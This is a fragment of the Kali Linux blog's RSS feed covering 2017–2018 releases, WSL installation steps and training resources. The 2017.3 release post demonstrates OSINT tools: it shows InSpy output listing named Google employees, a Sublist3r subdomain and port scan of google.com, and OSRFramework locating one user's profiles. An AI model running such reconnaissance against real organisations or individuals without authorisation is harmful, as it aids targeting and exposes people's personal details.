<img src="https://www.kali.org/blog/finding-packages-for-kali-linux/images/google-package-search.png" alt="" /> </a> </p> </p> <h3 id="learn-more">Learn More</h3> <p>Hopefully, this post will help you answer whether or not a certain tool is available in Kali (or Debian). For a much more detailed treatment of package management, we encourage you to check out the <a href="https://web.archive.org/web/20210922173942/https://kali.training/lessons/8-debian-package-management/">Kali Training site</a>.</p></description>
</item>
<item>
<title>Kali Linux in the Windows App Store</title>
<link>https://www.kali.org/blog/kali-linux-in-the-windows-app-store/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-in-the-windows-app-store/</guid>
<pubDate>Mon, 05 Mar 2018 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-in-the-windows-app-store/images/kali-windows-app-2018.jpg" type="image/jpg"/>
<description><p>No, really&hellip;this isn&rsquo;t clickbait. For the past few weeks, we&rsquo;ve been working with the Microsoft WSL team to get Kali Linux introduced into the Microsoft App Store as an official WSL distribution and today we&rsquo;re happy to <a href="https://blogs.msdn.microsoft.com/commandline/2018/03/05/kali-linux-for-wsl/">announce</a> the availability of the &ldquo;Kali Linux&rdquo; Windows application. For Windows 10 users, this means you can simply enable WSL, <a href="https://www.microsoft.com/en-us/p/kali-linux/9pkr34tncv07">search for Kali</a> in the Windows store, and install it with a single click. This is especially exciting news for penetration testers and security professionals who have limited toolsets due to enterprise compliance standards.</p> <p>While running Kali on Windows has a few drawbacks to running it natively (such as the lack of raw socket support), it does bring in some very interesting possibilities, such as extending your security toolkit to include a whole bunch of command line tools that are present in Kali. We will update our blog with more news and updates regarding the development of this app as it&rsquo;s released.</p> <p>We&rsquo;d like to take this opportunity to thank the WSL team at Microsoft, and specifically <a href="https://twitter.com/tara_msft">@tara_msft</a> and <a href="https://twitter.com/benhillis">@benhillis</a> for all the assistance and guidance with which this feat would not be possible. We hope you enjoy WSL&rsquo;d Kali on Windows 10!</p> <p>And now, a quick guide on getting Kali installed from the Microsoft App Store:</p> <h2 id="getting-kali-linux-installed-on-wsl">Getting Kali Linux Installed on WSL</h2> <p>Here&rsquo;s a quick description of the setup and installation process. For an easier copy / paste operation, these are the basic steps taken:</p> <p>1. Update your Windows 10 machine. Open an administrative PowerShell window and install the Windows Subsystem with this one-liner. A reboot will be required once finished:</p> <pre><code class="language-powershell">Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux </code></pre> <p>2. Once rebooted, open the Windows App store and search for the &ldquo;Kali Linux&rdquo; application, or alternatively click <a href="https://www.microsoft.com/en-us/p/kali-linux/9pkr34tncv07">here</a> to go there directly. Install the app and enjoy Kali!</p> <h2 id="updating-kali-linux-on-wsl">Updating Kali Linux on WSL</h2> <p>Updating Kali Linux on WSL is no different from any other instance of Kali:</p> <pre><code class="language-sh">apt-get update apt-get dist-upgrade </code></pre> <p>Here&rsquo;s a quick video of the process:</p> <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"> <iframe src="https://www.kali.org/blog/kali-linux-in-the-windows-app-store/https://player.vimeo.com/video/258822932?dnt=1" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="vimeo video" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe> </div> <h2 id="installing-penetration-testing-tools-on-kali">Installing Penetration Testing tools on Kali</h2> <p>Installing tools from the Kali Linux repository is usually done via <em><strong>apt</strong></em> commands. For example, to install the Metasploit Framework, you can simply:</p> <pre><code class="language-sh">apt-get update apt-get install metasploit-framework </code></pre> <p><strong>Note:</strong> Some Kali tools are identified by anti-virus software as malware. One way to deal with this situation is to allow anti-virus exceptions on the directory in which the Kali chroot resides in. The following video walks you through this process:</p> <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"> <iframe src="https://www.kali.org/blog/kali-linux-in-the-windows-app-store/https://player.vimeo.com/video/258892544?dnt=1" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="vimeo video" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe> </div> <h2 id="recovering-from-a-failed-kali-wsl-instance">Recovering from a failed Kali WSL instance</h2> <p>Sometimes, you can inadvertently kill your Kali WSL instance, due to an overzealous command, an unintentional action, or even due to Kali or WSL bugs. If this happens, here is a quick recovery guide to get back on top of things. <strong>Note</strong>: this process will wipe your Kali WSL chroot, and re-extract a new copy. Any changes made to the filesystem will be gone, and reset to default.</p> <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"> <iframe src="https://www.kali.org/blog/kali-linux-in-the-windows-app-store/https://player.vimeo.com/video/258835347?dnt=1" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="vimeo video" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe> </div> <h2 id="food-for-thought">Food for thought</h2> <p>The availability of the Kali Linux platform and toolset on Windows 10 brings with it many exciting possibilities which we haven&rsquo;t even begun to grasp - here&rsquo;s one example that got us scratching our heads. While not officially supported by WSL yet, we&rsquo;ve tested running a desktop manager such as XFCE on WSL&rsquo;d Kali&hellip;and it seems to work quite well:</p> <p><a href="https://www.kali.org/docs/general-use/xfce-with-rdp/">Setting up RDP with Xfce</a></p></description>
</item>
<item>
<title>Kali Linux 2018.1 Release</title>
<link>https://www.kali.org/blog/kali-linux-2018-1-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-2018-1-release/</guid>
<pubDate>Tue, 06 Feb 2018 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-2018-1-release/images/kali-release.jpg" type="image/jpg"/>
<description><p>Welcome to our first release of 2018, Kali Linux 2018.1. This fine release contains all <a href="https://bugs.kali.org/changelog_page.php">updated packages and bug fixes</a> since our <a href="https://www.kali.org/blog/kali-linux-2017-3-release/">2017.3 release</a> last November. This release wasn&rsquo;t without its challenges&ndash;from the <a href="https://meltdownattack.com/">Meltdown and Spectre</a> excitement (patches will be in the 4.15 kernel) to a couple of other <a href="https://bugs.kali.org/view.php?id=4483">nasty</a> <a href="https://bugs.kali.org/view.php?id=4488">bugs</a>, we had our work cut out for us but we prevailed in time to deliver this latest and greatest version for your installation pleasure.</p> <h4 id="kernel-updated-to-414">Kernel Updated to 4.14</h4> <p>Kali Linux 2018.1 has a shiny new 4.14.12 kernel. New kernels always have a lot of new features and the 4.14 kernel is no exception, although two new features really stand out.</p> <ul> <li><strong><em>AMD Secure Memory Encryption Support</em></strong> - Secure Memory Encryption is a feature that will be in newer AMD processors that enables automatic encryption and decryption of DRAM. The addition of this features means that systems will no longer (in theory) be vulnerable to <a href="https://en.wikipedia.org/wiki/Cold_boot_attack">cold-boot attacks</a> because, even with physical access, the memory will be not be readable.</li> <li><strong><em>Increased Memory Limits</em></strong> - Current (and older) 64-bit processors have a limit of 64 TB of physical address space and 256 TB of virtual address space (VAS), which was sufficient for more than a decade but with some server hardware shipping with 64 TB of memory, the limits have been reached. Fortunately, upcoming processors will enable <a href="https://lwn.net/Articles/717293/">5-level paging</a>, support for which is included in the 4.14 kernel. In short, this means that these new processors will support 4 PB of physical memory and 128 PB of virtual memory. That&rsquo;s right, <em>petabytes</em>.</li> </ul> <h4 id="package-updates">Package Updates</h4> <p>In addition to the updated kernel, we have also upgraded a number of packages, including <a href="https://www.kali.org/tools/zaproxy/">zaproxy</a>, <a href="https://github.com/securesocketfunneling/ssf">secure-socket-funneling</a>, <a href="https://www.kali.org/tools/pixiewps/">pixiewps</a>, <a href="https://www.kali.org/tools/seclists/">seclists</a>, <a href="https://www.kali.org/tools/burpsuite/">burpsuite</a>, <a href="https://dbeaver.io/">dbeaver</a>, and <a href="https://www.kali.org/tools/reaver/">reaver</a>. If you already have a Kali installation, you can easily get the latest version of these tools along with everything else that has been updated:</p> <pre><code class="language-sh">apt update &amp;&amp; apt full-upgrade </code></pre> <p>Note that if you haven&rsquo;t updated your Kali installation in some time (tsk2), you will like receive a GPG error about the repository key being expired (ED444FF07D8D0BF6). Fortunately, this issue is quickly resolved by running the following as root:</p> <pre><code class="language-sh">wget -q -O - https://archive.kali.org/archive-key.asc | apt-key add </code></pre> <h4 id="hyper-v-updates">Hyper-V Updates</h4> <p>For those of you using Hyper-V to run the <a href="https://www.kali.org/get-kali/#kali-vm">Kali virtual machines</a> provided by OffSec, you will find that the Hyper-V virtual machine is now <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn282285(v=ws.11)">generation 2</a>, which means it&rsquo;s now UEFI-based and expanding/shrinking HDD is supported. The Hyper-V <a href="https://docs.microsoft.com/en-us/windows-server/virtualization/hyper-v/supported-debian-virtual-machines-on-hyper-v">integration services</a> are also included, which supports Dynamic Memory, Network Monitoring/Scaling, and Replication.</p> <h3 id="download-kali-linux-20181">Download Kali Linux 2018.1</h3> <p>As always, you can download our official ISO images on our <a href="https://www.kali.org/get-kali/">download page</a>, where you will also find links to the pre-made <a href="https://www.kali.org/get-kali/#kali-vm">virtual machines</a> and <a href="https://www.kali.org/get-kali/#kali-arm">ARM images</a> provided by OffSec. If you encounter any bugs with this, or any other, release, please don&rsquo;t suffer in silence and open a report on the <a href="https://bugs.kali.org/main_page.php">Kali Bug Tracker</a> so we can investigate and fix it.</p></description>
</item>
<item>
<title>Your Journey Starts Here</title>
<link>https://www.kali.org/blog/your-kali-training-journey-starts-here/</link>
<guid isPermaLink="true">https://www.kali.org/blog/your-kali-training-journey-starts-here/</guid>
<pubDate>Tue, 30 Jan 2018 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/your-kali-training-journey-starts-here/images/kali-training-journey.jpg" type="image/jpg"/>
<description> <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"> <iframe src="https://www.kali.org/blog/your-kali-training-journey-starts-here/https://player.vimeo.com/video/226942296?dnt=1" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="vimeo video" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe> </div> <blockquote> <p><strong>&ldquo;Whether you&rsquo;re new to the fight, or a seasoned pro, don&rsquo;t stop training&hellip;&rdquo;</strong></p> </blockquote> <p>This statement, like the video that introduced it, has real punch. We did this on purpose to get you fired up, excited about your training, and to kickstart your journey. If it worked, and you&rsquo;re in the fight, welcome aboard! If you haven&rsquo;t jumped in for whatever reason, we want to introduce you to the plethora of resources we&rsquo;ve made available to help you master Kali Linux, the penetration testing distribution.</p> <p>You&rsquo;ve likely heard about the first, official Kali Linux book: Kali Linux Revealed, Mastering The Penetration Testing Distribution available from OffSec Press. Don&rsquo;t worry, this isn&rsquo;t a sales pitch. We&rsquo;ve made the book available for free in both online HTML and PDF versions because we love you. But wait, there&rsquo;s more. We&rsquo;ve also made chapter exercises available online at <a href="https://kali.training">Kali.training</a> (after free registration) so you can test your knowledge and get some hands-on experience as you work through the book. We&rsquo;ve also created our first Kali Linux certification, the Kali Linux Certified Professional (KLCP), so you can take your training to the next level. This is where some folks get either overwhelmed or confused, so let&rsquo;s talk about what all this is, exactly.</p> <h2 id="kali-linux-revealed---whats-that">Kali Linux Revealed - What&rsquo;s That</h2> <p>First, let&rsquo;s talk about Kali Linux Revealed. Whether you buy the (fairly-priced) physical book from retailers like <del>Amazon</del> , download the free PDF, or follow along with the <a href="https://kali.training/">online version of the book</a>, you&rsquo;re getting exactly the same content. There is no difference. So why are we selling a book and giving it away? The fact is, we&rsquo;re not trying to make a business by selling books. We wrote the book to provide an official manual for Kali Linux, to provide a body of knowledge for the KLCP, and to improve the knowledge base of the Kali community.</p> <p>The follow-on exercises at <a href="https://kali.training">Kali.training</a> help solidify your knowledge and give you practical hands-on experience. All of this will help prepare you for the ultimate test: the KLCP</p> <h2 id="klcp">KLCP?</h2> <p>So what is the KLCP, exactly? Once you&rsquo;ve studied (and not simply read or skimmed) the book and worked through the exercises, you&rsquo;re probably ready for the KLCP. Consisting of a 90-minute, 80-question multiple choice exam (proctored by <a href="https://web.archive.org/web/20220129202701/https://home.pearsonvue.com/kali">Pearson Vue</a>), the KLCP is the foundational Kali Linux certification.</p> <h2 id="whats-inside">What&rsquo;s Inside</h2> <p>All of this is centered around the content in the Kali Linux Revealed print, online, and PDF books, so let&rsquo;s dive into what&rsquo;s covered.</p> <p>It&rsquo;s been mentioned that we&rsquo;ve provided a resource that&rsquo;s too basic for some and too advanced for others. That&rsquo;s fair because we provide a somewhat gentle introduction for new users, thoroughly cover all Kali Linux features, and then delve into some fairly advanced topics as well. So, yes, it&rsquo;s a fairly broad range.</p> <p>To start things off, we discuss the basics of Kali Linux in the first few chapters. In the first chapter, we share the history of Kali Linux, explain the relationship with Debian, talk about Kali features, policies and use cases, and discuss what Kali is best used for. We follow this up in chapter two with details on how to download and verify Kali Linux, how to create a bootable Kali USB, and how to set up a virtual machine. In chapter three, we discuss Linux fundamentals, talk about terminology and basic commands, and touch on system logging and troubleshooting.</p> <p>Once you register on Kali.training, you can dive in to end-of-chapter exercises. Working through these exercises, you will:</p> <ul> <li>Set up a new VM</li> <li>Boot Kali Live</li> <li>Inspect kernel boot options</li> <li>Download (and verify) Kali</li> <li>Install Kali on USB and VM</li> <li>Modify kernel boot parameters</li> <li>Practice Linux job control</li> <li>Search and manipulate files</li> <li>Enumerate and manipulate hardware settings</li> </ul> <p>This is the turning point of the table of contents, where beginners are starting to get pumped and advanced users have dismissed this as &ldquo;useless beginner stuff&rdquo;. While many are quite happy bouncing around and using the book as a reference, if you&rsquo;re a serious student or a professional seeking to better your skills or nail your KLCP, you should not simply dismiss or skip any of the chapters. There really is a lot of good material for users at every level and anything in the book is fair game for the KLCP.</p> <p><p> <a href='https://www.kali.org/blog/your-kali-training-journey-starts-here/images/kali-training-post.png'> <img src="https://www.kali.org/blog/your-kali-training-journey-starts-here/images/kali-training-post.png" alt="" /> </a> </p> </p> <h2 id="continue-the-journey">Continue The Journey</h2> <p>Continuing with our journey, we step into chapter four where we cover installation requirements, show you how to install Kali as a standard install, ARM install, unattended install and as a fully encrypted installation with LVM and LUKS.</p> <p>If you&rsquo;ve never strayed from the standard installation path, you&rsquo;re missing out on the power of unattended installation and the ultimate security of encryption with LUKS &ldquo;nuke&rdquo;. You&rsquo;ll get hands-on at Kali.training with a fully encrypted install, an unattended install and a standard as well as a fully customized ARM install on a Raspberry Pi. The final exercise in this chapter has you not only building a &ldquo;Kali Pi&rdquo; but mounting and chrooting the file system to make post-installation changes. This gives you extreme flexibility, takes you off the path of a standard burned-image installation and is especially eye-opening for new users.</p> <p>In chapter five, we dive into service and user configuration and management, then follow this up in chapter six with tips on troubleshooting Kali Linux and self-diagnosing and getting help with any aspect of your installation. As we roll into chapter seven, we&rsquo;ll dig into security topics and cover firewall and log configuration and monitoring, package auditing and several host-based intrusion detection tools. While most of this may seem like basic Linux system administration, the fact is that Kali is really a killer secure base OS and each of these skills is important for building a strong foundational knowledge of Kali.</p> <p>As you pass through these chapters and tackle the exercises, you will:</p> <ul> <li>Add new user accounts</li> <li>Configure network without Network Manager</li> <li>Spin up hostapd as WAP</li> <li>Configure Apache and PostgreSQL</li> <li>Install masscan with a custom web interface</li> <li>Create a custom PI access point with hostapd</li> <li>Create and test firewall rules</li> <li>Learn to detect and prevent password brute forcing</li> <li>Install and modify a host-based IDS system</li> </ul> <p>This is yet another turning point of the book. We&rsquo;ve covered basic Kali installation and use, stepped into administrative roles and gotten even the most basic user up to a decent foundational level of knowledge. Our advanced users may be frustrated, wondering when they get their turn to play. That time is now. The next three chapters are the meat of Kali Linux Revealed. They are the longest and most densely packed chapters in the entire book and each chapter contains a ton of cool stuff that will appeal to even the most advanced user.</p> <h2 id="into-the-fray">Into The Fray</h2> <p>We jump right into the fray in chapter eight as we examine Debian Package Management. Debian is a robust, mature, operating system that allowed us to take Kali to the next level as a distribution. We gained so many advanced features when we moved to Debian, and in this chapter we start to lay out the foundations of what makes these features possible.</p> <p>If you&rsquo;ve done anything with Kali, you&rsquo;ve likely used apt to update your installation. It&rsquo;s easy to just blow off this process, follow the directions, and move on. But what happens behind the scenes with Debian&rsquo;s package management tools is impressive, powerful, and flexible. We go behind-the-scenes and talk about all the components that make this possible. For example, do you understand the difference between dpkg, apt, and apt-get? What about aptitude and synaptic? Each of these utilities has powerful functionality and we get in deep so we can get into some powerful features in the following chapters.</p> <p>At the end of chapter eight, you dive into the exercises where you will:</p> <ul> <li>Install bleeding edge software, like the Social Engineering Toolkit (SET)</li> <li>Create custom packages, including a custom-built offline installation of Nessus that includes all plugins</li> <li>Install and configure packages from foreign architectures</li> <li>Install Windows-based programs in Kali Linux</li> </ul> <p>In chapter nine, we will show you how to modify Kali packages, recompile the Kali kernel, and build custom Kali live ISO images. Custom packages are especially cool, allowing you to create a package, share it, deploy it, and even roll back your changes if you need to.</p> <p>As we dive into the exercises, you will:</p> <ul> <li>Build custom Kali live ISO images, like an much-upgraded version of Angela&rsquo;s live USB from Mr. Robot</li> <li>Build an unencrypted live Kali USB</li> <li>Build an encrypted live Kali USB with LUKS &ldquo;nuke&rdquo; allowing you to obliterate your data with a specific decryption password.</li> <li>Fork your own metapackage containing exactly the tools you want to deploy</li> </ul> <p>As we cruise in to chapter ten, we&rsquo;ll show you how to install Kali Linux over the network, including options for complete unattended installation. We&rsquo;ll also show you how to create a full-featured enterprise installation of Kali that allows you to deploy Kali &ldquo;minions&rdquo; that you can control from a central &ldquo;master&rdquo;. Finally, we will show you how to create a custom package repository that you can use to deploy your own completely customized packages. When you pull together the skills in these final chapters, you will be able to create custom Kali installations with your own package builds and configuration options. You will even have the power to build custom live instances primed to do anything you want after booting. You&rsquo;ll be able to network-install machines with completely unattended installation options, stand up your own package repositories with custom tools for rapid deployment, and monitor, update, and control deployed Kali instances without installing any additional tools on top of Kali.</p> <h2 id="take-the-next-step">Take The Next Step</h2> <p>At this level, the true power of Kali Linux is revealed and you have truly &ldquo;mastered the penetration testing distribution&rdquo;.</p> <p>Kali Linux Revealed, the resources at <a href="https://kali.training/">Kali.training</a> and the KLCP encompass so much cool stuff, it&rsquo;s pretty hard to summarize, but we hope you&rsquo;ll take the next step in your journey and join us at Kali.training!</p></description>
</item>
<item>
<title>Kali on the Windows Subsystem for Linux</title>
<link>https://www.kali.org/blog/kali-on-the-windows-subsystem-for-linux/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-on-the-windows-subsystem-for-linux/</guid>
<pubDate>Wed, 10 Jan 2018 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-on-the-windows-subsystem-for-linux/images/kali-on-windows-10-kali-post.jpg" type="image/jpg"/>
<description><p><strong>Update</strong> : <strong>This post is outdated.</strong> <strong>For a better way of getting Kali Linux on Windows 10, install</strong> <a href="https://www.kali.org/blog/kali-linux-in-the-windows-app-store/">Kali Linux from the App store</a>.</p> <p>We&rsquo;re always on the prowl for novel environments to run Kali on, and with the introduction of the <a href="https://docs.microsoft.com/en-us/windows/wsl/install-win10">Windows Subsystem for Linux</a> (WSL) in Windows 10, new and exciting possibilities have surfaced. After all, if the WSL can support Ubuntu, it shouldn&rsquo;t be too hard to incorporate another Debian-like distribution, right? This is especially true with the <a href="https://github.com/RoliSoft/WSL-Distribution-Switcher"><strong>Windows Subsystem for Linux Distribution Switcher</strong></a> utility.</p> <h2 id="kali-on--windows-really">Kali on &hellip; Windows? Really?</h2> <p>While this setup of Kali on Windows is not optimal due to various environmental restrictions (such as the lack of raw sockets and lack of customised Kali kernel), there are still many situations where having Kali Linux alongside your Windows 10 machine can be beneficial. One example that comes to mind is consolidation of workspaces, especially if Windows is your main working environment. Other useful situations that crossed our minds were standardizing tools and scripts to run across multiple environments, quick porting of Linux penetration testing command line tools to Windows, etc. For example, below is a screenshot of running the Metasploit Framework from Kali Linux, over WSL.</p> <p><p> <a href='https://www.kali.org/blog/kali-on-the-windows-subsystem-for-linux/images/Kali_Linux_WSL_msf.png'> <img src="https://www.kali.org/blog/kali-on-the-windows-subsystem-for-linux/images/Kali_Linux_WSL_msf.png" alt="" /> </a> </p> </p> <h2 id="setting-up-the-environment">Setting up the Environment</h2> <p>While the setup is described well over at the WSL Distribution Switcher <a href="https://github.com/RoliSoft/WSL-Distribution-Switcher">README</a> file, we&rsquo;ve made a quick 4-minute video to walk you through the setup and installation process. For an easier copy / paste operation, these are the basic steps taken:</p> <p>1. Update your Windows 10 machine. Open an administrative PowerShell window and install the Windows Subsystem with this one-liner. A reboot will be required once finished:</p> <pre><code class="language-plain">Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux </code></pre> <p>2. Once rebooted, open a command line shell and run the following commands to install the default Ubuntu environment. This will lay down the foundations for our Kali install:</p> <pre><code class="language-sh">lxrun /install </code></pre> <p>3. Setup and install the WSL Switcher, download a Kali base, and extract it to disk:</p> <pre><code class="language-sh">git clone https://github.com/RoliSoft/WSL-Distribution-Switcher.git cd WSL-Distribution-Switcher python get-prebuilt.py kalilinux/kali-linux-docker python install.py rootfs_kalilinux_kali-linux-docker_latest.tar.gz lxrun /setdefaultuser root </code></pre> <p>4. Now that Kali is set up on your Windows 10 machine, you can interact with it by running the &ldquo;bash&rdquo; command:</p> <pre><code class="language-sh">bash </code></pre> <p>5. At this point, you&rsquo;re inside Kali and you can use it as you normally do&ndash;install packages, use tools, etc. We strongly recommend first running an update and upgrade:</p> <pre><code class="language-sh">export LANG=C apt-get update apt-get dist-upgrade </code></pre> <p>Without further ado, here&rsquo;s the video demonstration of the setup described above:</p> <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"> <iframe src="https://www.kali.org/blog/kali-on-the-windows-subsystem-for-linux/https://player.vimeo.com/video/250475157?dnt=1" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="vimeo video" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe> </div></description>
</item>
<item>
<title>Kali Linux 2017.3 Release</title>
<link>https://www.kali.org/blog/kali-linux-2017-3-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-2017-3-release/</guid>
<pubDate>Tue, 21 Nov 2017 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-2017-3-release/images/kali-release.jpg" type="image/jpg"/>
<description><p>We are pleased to announce the immediate availability of <a href="https://www.kali.org/get-kali/">Kali Linux 2017.3</a>, which includes all patches, fixes, updates, and improvements since our <a href="https://www.kali.org/blog/kali-linux-2017-2-release/">last release</a>. In this release, the kernel has been updated to 4.13.10 and it includes some notable improvements:</p> <ul> <li><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=eef914a9eb5eb83e60eb498315a491cd1edc13a1">CIFS now uses SMB 3.0 by default</a></li> <li><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=e08ac99fa2a25626f573cfa377ef3ddedf2cfe8f">EXT4 directories can now contain 2 billion entries instead of the old 10 million limit</a></li> <li><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=3c4d7559159bfe1e3b94df3a657b2cda3a34e218">TLS support is now built into the kernel itself</a></li> </ul> <p>In addition to the new kernel and all of the updates and fixes we pull from Debian, we have also updated our packages for <a href="https://www.kali.org/tools/reaver/">Reaver</a>, <a href="https://www.kali.org/tools/pixiewps/">PixieWPS</a>, <a href="https://www.kali.org/tools/burpsuite/">Burp Suite</a>, <a href="https://www.kali.org/docs/tools/removed-tools/">Cuckoo</a>, <a href="https://www.kali.org/tools/set/">The Social Engineering Toolkit</a>, and more. Take a look at the <a href="https://bugs.kali.org/changelog_page.php">Kali Changelog</a> to see what else has been updated in this release, or read on to see what else is new.</p> <h2 id="new-tool-additions">New Tool Additions</h2> <p>Since our last release in September, we&rsquo;ve added four new tools to the distribution, most of which focus on the always-lucrative Open-source information gathering. These new tools are not included in the default installation but after an &lsquo;apt update&rsquo;, you can check out and install the ones that interest you. We, of course, think they&rsquo;re all interesting and hope you do as well.</p> <h3 id="inspy">InSpy</h3> <p><a href="https://www.kali.org/tools/inspy/">InSpy</a> is a small but useful utility that performs enumeration on LinkedIn and can find people based on job title, company, or email address:</p> <pre><code class="language-console">root@kali:~# apt update &amp;&amp; apt -y install inspy root@kali:~# inspy --empspy /usr/share/inspy/wordlists/title-list-large.txt google InSpy 2.0.3 2017-11-14 14:04:47 53 Employees identified 2017-11-14 14:04:47 Birkan Cara Product Manager at Google 2017-11-14 14:04:47 Fuller Galipeau Google 2017-11-14 14:04:47 Catalina Alicia Esrat Account Executive at Google 2017-11-14 14:04:47 Coplan Pustell Recruiter at Google 2017-11-14 14:04:47 Kristin Suzanne Lead Recruiter at Google 2017-11-14 14:04:47 Baquero Jahan Executive Director at Google 2017-11-14 14:04:47 Jacquelline Bryan VP, Google and President of Google.org 2017-11-14 14:04:47 Icacan M. de Lange Executive Assistant at Google ... </code></pre> <h3 id="cherrytree">CherryTree</h3> <p>The oft-requested <a href="https://www.kali.org/tools/cherrytree/">CherryTree</a> has now been added to Kali for all of your note-taking needs. CherryTree is very easy to use and will be familiar to you if you&rsquo;ve used any of the &ldquo;big-name&rdquo; note organization applications:</p> <pre><code class="language-console">root@kali:~# apt update &amp;&amp; apt -y install cherrytree </code></pre> <p><p> <a href='https://www.kali.org/blog/kali-linux-2017-3-release/images/cherrytree0.png'> <img src="https://www.kali.org/blog/kali-linux-2017-3-release/images/cherrytree0.png" alt="" /> </a> </p> </p> <h3 id="sublist3r">Sublist3r</h3> <p><a href="https://www.kali.org/tools/sublist3r/">Sublist3r</a> is a great application that enables you to enumerate subdomains across multiple sources at once. It has integrated the venerable SubBrute, allowing you to also brute force subdomains using a wordlist:</p> <pre><code class="language-console">root@kali:~# apt update &amp;&amp; apt -y install sublist3r root@kali:~# sublist3r -d google.com -p 80 -e Bing ____ _ _ _ _ _____ / ___| _ _| |__ | (_)___| |_|___ / _ __ \___ \| | | | '_ \| | / __| __| |_ \| '__| ___) | |_| | |_) | | \__ \ |_ ___) | | |____/ \__,_|_.__/|_|_|___/\__|____/|_| # Coded By Ahmed Aboul-Ela - @aboul3la [-] Enumerating subdomains now for google.com [-] Searching now in Bing.. [-] Total Unique Subdomains Found: 46 [-] Start port scan now for the following ports: 80 ads.google.com - Found open ports: 80 adwords.google.com - Found open ports: 80 analytics.google.com - Found open ports: 80 accounts.google.com - Found open ports: 80 aboutme.google.com - Found open ports: 80 adssettings.google.com - Found open ports: 80 console.cloud.google.com - Found open ports: 80 ... </code></pre> <h3 id="osrframework">OSRFramework</h3> <p>Another excellent OSINT tool that has been added to the repos is <a href="https://www.kali.org/tools/osrframework/">OSRFramework</a>, a collection of scripts that can enumerate users, domains, and more across over 200 separate services:</p> <pre><code class="language-console">root@kali:~# apt update &amp;&amp; apt -y install osrframework root@kali:~# searchfy.py -q &quot;dookie2000ca&quot; ___ ____ ____ _____ _ / _ \/ ___|| _ \| ___| __ __ _ _ __ ___ _____ _____ _ __| | __ | | | \___ \| |_) | |_ | '__/ _` | '_ ` _ \ / _ \ \ /\ / / _ \| '__| |/ / | |_| |___) | _ &lt;| _|| | | (_| | | | | | | __/\ V V / (_) | | | &lt; \___/|____/|_| \_\_| |_| \__,_|_| |_| |_|\___| \_/\_/ \___/|_| |_|\_ Version: OSRFramework 0.17.2 Created by: Felix Brezo and Yaiza Rubio, (i3visio) searchfy.py Copyright (C) F. Brezo and Y. Rubio (i3visio) 2014-2017 This program comes with ABSOLUTELY NO WARRANTY. This is free software, and you are welcome to redistribute it under certain conditions. For additional info, visit https://www.gnu.org/licenses/agpl-3.0.txt 2017-11-14 14:54:52.535108 Starting search in different platform(s)... Relax! Press &lt;Ctrl + C&gt; to stop... 2017-11-14 14:55:04.310148 A summary of the results obtained are listed in the following table: Sheet Name: Profiles recovered (2017-11-14_14h55m). +---------------------------------+---------------+------------------+ | i3visio_uri | i3visio_alias | i3visio_platform | +=================================+===============+==================+ | http://github.com/dookie2000ca | dookie2000ca | GitHub | +---------------------------------+---------------+------------------+ | http://twitter.com/dookie2000ca | dookie2000ca | Twitter | +---------------------------------+---------------+------------------+ 2017-11-14 14:55:04.327954 You can find all the information collected in the following files: ./profiles.csv 2017-11-14 14:55:04.328012 Finishing execution... Total time used: 0:00:11.792904 Average seconds/query: 11.792904 seconds Did something go wrong? Is a platform reporting false positives? Do you need to integrate a new one and you don't know how to start? Then, you can always place an issue in the GitHub project: https://github.com/i3visio/osrframework/issues Note that otherwise, we won't know about it! </code></pre> <h2 id="massive-maltego-metamorphosis">Massive Maltego Metamorphosis</h2> <p>One of our favourite applications in Kali has always been Maltego, the incredible Open-source information gathering tool from Paterva, and the equally incredible Casefile. These two applications had always been separate entities (get it?) but as of late September, they are now combined into one amalgamated application that still allows you to run Maltego Community Edition and Casefile, but now it also works for those of you with Maltego Classic or Maltego XL licenses. As always, the tools perform wonderfully and look great doing it.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2017-3-release/images/maltego0.png'> <img src="https://www.kali.org/blog/kali-linux-2017-3-release/images/maltego0.png" alt="" /> </a> </p> </p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2017-3-release/images/maltego1.png'> <img src="https://www.kali.org/blog/kali-linux-2017-3-release/images/maltego1.png" alt="" /> </a> </p> </p> <h2 id="get-the-goods">Get the Goods</h2> <p>As usual, we have updated our standard ISO images, VMware and VirtualBox virtual machines, ARM images, and cloud instances, all of which can be found via the <a href="https://www.kali.org/get-kali/">Kali Downloads</a> 